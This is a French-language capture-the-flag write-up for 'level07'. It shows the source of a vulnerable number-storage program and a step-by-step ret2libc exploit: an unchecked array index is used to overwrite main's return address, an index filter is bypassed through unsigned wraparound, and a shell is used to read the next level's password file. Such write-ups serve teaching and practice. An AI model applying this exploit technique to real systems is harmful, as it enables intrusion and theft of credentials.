# level07 : overflow index + ret2libc

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void clear_stdin(void) {
    int c;
    do {
        c = getchar();
    } while (c != '\n' && c != EOF);
}

unsigned int get_unum(void) {
    unsigned int val = 0;
    fflush(stdout);
    scanf("%u", &val);
    clear_stdin();
    return val;
}

void prog_timeout(void) {
    exit(1);
}

unsigned int store_number(unsigned int *data) {
    unsigned int number;
    unsigned int index;

    printf(" Number: ");
    number = get_unum();
    printf(" Index: ");
    index = get_unum();

    if (index % 3 == 0 || (number >> 24) == 0xb7) {
        puts(" *** ERROR! ***");
        puts("   This index is reserved for wil!");
        puts(" *** ERROR! ***");
        return 1;
    } else {
        data[index] = number;
        return 0;
    }
}

unsigned int read_number(unsigned int *data) {
    unsigned int index;
    printf(" Index: ");
    index = get_unum();
    printf(" Number at data[%u] is %u\n", index, data[index]);
    return 0;
}

int main(int argc, char **argv, char **envp) {
    unsigned int data[100];
    char command[20];
    int status;

    memset(data, 0, sizeof(data));

    if (argv != NULL) {
        for (char **arg = argv; *arg != NULL; arg++) {
            memset(*arg, 0, strlen(*arg));
        }
    }
    if (envp != NULL) {
        for (char **env = envp; *env != NULL; env++) {
            memset(*env, 0, strlen(*env));
        }
    }

    puts("----------------------------------------------------\n"
         "  Welcome to wil's crappy number storage service!   \n"
         "----------------------------------------------------\n"
         " Commands:                                          \n"
         "    store - store a number into the data storage    \n"
         "    read  - read a number from the data storage     \n"
         "    quit  - exit the program                        \n"
         "----------------------------------------------------\n"
         "   wil has reserved some storage :>                 \n"
         "----------------------------------------------------\n");

    while (1) {
        printf("Input command: ");
        status = 1;

        if (fgets(command, sizeof(command), stdin) == NULL) {
            break;
        }

        size_t len = strlen(command);
        if (len > 0 && command[len - 1] == '\n') {
            command[len - 1] = '\0';
        }

        if (strcmp(command, "store") == 0) {
            status = store_number(data);
        } else if (strcmp(command, "read") == 0) {
            status = read_number(data);
        } else if (strcmp(command, "quit") == 0) {
            break;
        }

        if (status == 0) {
            printf(" Completed %s command successfully\n", command);
        } else {
            printf(" Failed to do %s command\n", command);
        }

        memset(command, 0, sizeof(command));
    }

    return 0;
}
```

`store`/`read` font `data[index]` sans borne sur l'index -> ecriture/lecture arbitraire. filtres de `store` : `index % 3 == 0` interdit, et `(number >> 24) == 0xb7` bloque les anciennes adresses de la libc 0xb7 mais vu que le binaire est en dynamique et la libc maintenant sur override est en 0xf7 donc le filtre fonctionne pas on peux faire le meme exploit que le level04 avec system

adresses libc (gdb) :

    (gdb) p system   -> 0xf7e6aed0
    (gdb) find &system, +9999999, "/bin/sh"   -> 0xf7f897ec

    0xf7e6aed0 = 4159090384
    0xf7f897ec = 4160264172
offset du ret de main (gdb) :

    (gdb) break read_number
    (gdb) run                
    (gdb) x/wx $ebp+8        (1er arg de read_number) -> 0xffffdae4
    (gdb) frame 1            pour remonter a appelant donc main
    (gdb) info frame         registers: ... eip at 0xffffdcac

    (0xffffdcac - 0xffffdae4) / 4 = 114    ->   adresse de data  - eip la difference entre les 2 donne index pour exploit index de data[114] = adresse de retour de main

contourner le filtre `index % 3 == 0` , c'est scanf avec le flag u , donc pour unsigned int :

        on prends le uintmax = 4294967295 +1 (pour le 0), 4294967296 / 4 = 1073741824 + 114 = 1073741938

        donc 114 peut aussi s'ecrire 1073741938 parce que lorsque que data prends 1073741938 il fait *4 pour un uint, donc 4294967752 sauf qu'un uint max fait 4294967296 donc 4294967752 - 4294967296 = 456 / 4 = 114 

payload (le meme que exo4)

    data[114] = &system       (ecrase le ret de main -> saute dans system)
    data[115] = RETS          (4 octets bidon, retour de system : on s'en fiche)
    data[116] = &"/bin/sh"    (arg de system)

    Input command: store
    Number: 4159090384      # &system (0xf7e6aed0 en décimal)
    Index: 1073741938       # data[114] (114 + le tour de compteur)
    Input command: store
    Number: 0               # le ret random
    Index: 115
    Input command: store
    Number: 4160264172      # &"/bin/sh" (0xf7f897ec en décimal)
    Index: 116
    Input command: quit

    cat /home/users/level08/.pass


